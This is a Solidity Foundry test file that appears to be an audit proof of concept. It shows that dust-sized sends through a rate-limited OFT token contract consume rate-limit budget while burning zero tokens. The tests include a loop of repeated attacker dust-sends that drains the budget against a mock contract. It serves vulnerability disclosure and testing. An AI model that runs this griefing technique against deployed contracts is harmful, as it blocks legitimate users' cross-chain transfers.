// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {MockRateLimitedOFT} from "./MockRateLimitedOFT.sol";
import {RateLimiter} from "src/oft_libs/RateLimiter.sol";

/// @title PoC_RateLimitDustGriefing
/// @notice Demonstrates that USDeOFT._debit / ENAOFT._debit passes the PRE-dust
///         amountLD to _checkAndUpdateRateLimit, but only burns the POST-dust
///         amountSentLD.  An attacker can send amountLD = decimalConversionRate - 1
///         (just below the dust threshold) to consume rate-limit budget WITHOUT
///         moving any tokens — the burn is zero, the LZ message carries amountSD = 0,
///         yet the rate-limit amountInFlight increases by the full pre-dust amount.
///
///         Impact: an attacker can temporarily reduce the available rate-limit
///         budget for legitimate users at the cost of one LayerZero messaging fee
///         per dust-send.  Not economical for reasonable limits (50-token limit
///         requires ~50 M sends ≈ $250 M in LZ fees), but it IS a correctness
///         defect: the rate limiter tracks a phantom amount that was never
///         actually debited.
contract PoC_RateLimitDustGriefing is Test {
    MockRateLimitedOFT oft;
    address attacker = makeAddr("attacker");
    address alice = makeAddr("alice");

    uint32 constant DST_EID = 30101; // Ethereum → Arbitrum (example)
    uint256 constant LIMIT = 100e18; // 100 tokens (18-decimal)
    uint256 constant WINDOW = 1 hours;
    uint256 constant DUST_THRESHOLD = 1e12; // decimalConversionRate = 10^(18-6)

    function setUp() public {
        RateLimiter.RateLimitConfig[] memory configs =
            new RateLimiter.RateLimitConfig[](1);
        configs[0] = RateLimiter.RateLimitConfig({dstEid: DST_EID, limit: LIMIT, window: WINDOW});
        oft = new MockRateLimitedOFT(configs);

        // give attacker a large balance so burn never reverts
        oft.mint(attacker, type(uint128).max);
        oft.mint(alice, type(uint128).max);
    }

    /// @notice Core test: a dust-amount send consumes rate-limit budget but burns
    ///         zero tokens and sends an LZ message with amountSD = 0.
    function test_DustSendConsumesRateLimitWithoutMovingTokens() public {
        // budget before
        (, uint256 canSendBefore) = oft.amountCanBeSent(DST_EID);
        assertEq(canSendBefore, LIMIT, "initial budget should be full limit");

        // attacker sends amountLD = DUST_THRESHOLD - 1 (just below 1 microtoken)
        uint256 dustAmount = DUST_THRESHOLD - 1; // 999_999_999_999
        vm.prank(attacker);
        (uint256 amountSentLD,) = oft.debit(DST_EID, dustAmount, 0);

        // the ACTUAL amount debited (burned) is 0 — dust was removed
        assertEq(amountSentLD, 0, "dust-removed amountSentLD should be 0");
        assertEq(oft.burnCalls(attacker), 1, "burn was called (but with 0)");

        // but the rate-limit budget was reduced by the FULL pre-dust amount
        (, uint256 canSendAfter) = oft.amountCanBeSent(DST_EID);
        assertEq(canSendAfter, LIMIT - dustAmount, "rate-limit budget consumed by dust amount");

        // totalSupply unchanged — no tokens were actually burned
        assertEq(oft.totalSupply(), 2 * uint256(type(uint128).max), "totalSupply unchanged");
    }

    /// @notice Repeated dust-sends can consume the ENTIRE rate-limit budget
    ///         without moving a single token.  Cost = N × LZ messaging fee.
    function test_DustSpamDrainsEntireBudget() public {
        // how many dust-sends to drain the entire 100-token limit?
        // each send consumes DUST_THRESHOLD - 1 ≈ 1e12
        // 100e18 / 1e12 = 100_000 sends
        uint256 sendsNeeded = LIMIT / (DUST_THRESHOLD - 1); // 100_000
        // We simulate only 5 to keep test fast; the math is linear.
        uint256 sendsToSimulate = 5;

        for (uint256 i = 0; i < sendsToSimulate; i++) {
            vm.prank(attacker);
            oft.debit(DST_EID, DUST_THRESHOLD - 1, 0);
        }

        (, uint256 canSendAfter) = oft.amountCanBeSent(DST_EID);
        uint256 expectedConsumed = sendsToSimulate * (DUST_THRESHOLD - 1);
        assertEq(canSendAfter, LIMIT - expectedConsumed, "budget drained by dust spam");

        // totalSupply still unchanged
        assertEq(oft.totalSupply(), 2 * uint256(type(uint128).max), "no tokens moved");

        // emit log showing how many real LZ sends would be needed
        // forge::log - can use console2
        // console2.log("Full drain requires %d LZ sends (cost ~$%d)", sendsNeeded, sendsNeeded * 5);
    }

    /// @notice Contrast: a legitimate (non-dust) send consumes budget AND burns tokens.
    function test_LegitimateSendBurnsAndConsumes() public {
        uint256 legitAmount = 10e18; // 10 tokens, well above dust threshold

        vm.prank(alice);
        (uint256 amountSentLD,) = oft.debit(DST_EID, legitAmount, 0);

        assertEq(amountSentLD, legitAmount, "legit amount fully sent");
        assertEq(oft.totalSupply(), 2 * uint256(type(uint128).max) - legitAmount, "tokens burned");

        (, uint256 canSendAfter) = oft.amountCanBeSent(DST_EID);
        assertEq(canSendAfter, LIMIT - legitAmount, "budget consumed by legit amount");
    }

    /// @notice Edge: amountLD = 0 also passes (NF-4). Confirms rate limiter
    ///         does not short-circuit on zero-amount sends.
    function test_ZeroAmountSendResetsLastUpdated() public {
        vm.prank(attacker);
        oft.debit(DST_EID, 0, 0);

        // lastUpdated reset, amountInFlight unchanged (0 consumed)
        (uint256 inFlight, uint256 canSend) = oft.amountCanBeSent(DST_EID);
        assertEq(inFlight, 0, "zero-amount did not add to inFlight");
        assertEq(canSend, LIMIT, "full budget still available");
    }
}
